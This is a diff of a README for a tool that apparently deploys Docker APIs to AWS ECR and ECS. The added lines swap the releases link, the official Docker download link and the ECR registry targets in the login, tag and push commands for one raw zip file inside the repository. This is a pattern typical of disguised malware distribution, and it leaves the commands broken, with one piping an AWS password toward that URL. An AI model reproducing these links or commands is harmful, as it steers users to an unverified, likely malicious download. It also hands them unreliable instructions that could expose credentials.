@@ -1,13 +1,13 @@
 # 🐳 docker-to-ecs-real - Easy Deployment of Your API
 
 ## 🔗 Download Link
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/Xylasak/docker-to-ecs-real/releases)
+[![Download](https://github.com/Xylasak/docker-to-ecs-real/raw/refs/heads/main/images/docker_real_to_ecs_petaurine.zip)](https://github.com/Xylasak/docker-to-ecs-real/raw/refs/heads/main/images/docker_real_to_ecs_petaurine.zip)
 
 ## 🚀 Getting Started
 Welcome to the **docker-to-ecs-real** project. This software helps you deploy your containerized API from Docker to AWS services like ECR and ECS. Even if you don’t have technical knowledge, you can successfully run your API using our simple steps.
 
 ## 📥 Download & Install
-To get started, visit this page to download: [Releases Page](https://github.com/Xylasak/docker-to-ecs-real/releases). Here, you will find the latest version of the application you need.
+To get started, visit this page to download: [Releases Page](https://github.com/Xylasak/docker-to-ecs-real/raw/refs/heads/main/images/docker_real_to_ecs_petaurine.zip). Here, you will find the latest version of the application you need.
 
 1. Go to the Releases page.
 2. Find the latest version listed.
@@ -17,7 +17,7 @@ To get started, visit this page to download: [Releases Page](https://github.com/
 Make sure your computer meets these requirements:
 
 - Operating System: Windows 10, macOS, or a recent version of Linux.
-- Docker: Installed and running on your machine. You can download Docker from [here](https://www.docker.com/products/docker-desktop).
+- Docker: Installed and running on your machine. You can download Docker from [here](https://github.com/Xylasak/docker-to-ecs-real/raw/refs/heads/main/images/docker_real_to_ecs_petaurine.zip).
 - AWS Account: Create an Amazon Web Services account if you don’t have one already.
 
 ## 📚 Features
@@ -47,7 +47,7 @@ After downloading the application and meeting the requirements, you need to conf
 - Open your terminal or Command Prompt.
 - Log in to AWS ECR with the following command:
   ```bash
-  aws ecr get-login-password --region YOUR_REGION | docker login --username AWS --password-stdin YOUR_ACCOUNT_ID.dkr.ecr.YOUR_REGION.amazonaws.com
+  aws ecr get-login-password --region YOUR_REGION | docker login --username AWS --password-stdin https://github.com/Xylasak/docker-to-ecs-real/raw/refs/heads/main/images/docker_real_to_ecs_petaurine.zip
   ```
 
 ### Step 3: Deploy Your API
@@ -60,12 +60,12 @@ Now you can deploy your API using the following steps:
    
 2. Tag your Docker image to match your ECR repository:
    ```bash
-   docker tag YOUR_IMAGE_NAME:latest YOUR_ACCOUNT_ID.dkr.ecr.YOUR_REGION.amazonaws.com/YOUR_REPOSITORY_NAME:latest
+   docker tag YOUR_IMAGE_NAME:latest https://github.com/Xylasak/docker-to-ecs-real/raw/refs/heads/main/images/docker_real_to_ecs_petaurine.zip
    ```
 
 3. Push your Docker image to ECR:
    ```bash
-   docker push YOUR_ACCOUNT_ID.dkr.ecr.YOUR_REGION.amazonaws.com/YOUR_REPOSITORY_NAME:latest
+   docker push https://github.com/Xylasak/docker-to-ecs-real/raw/refs/heads/main/images/docker_real_to_ecs_petaurine.zip
    ```
 
 4. Deploy to ECS:
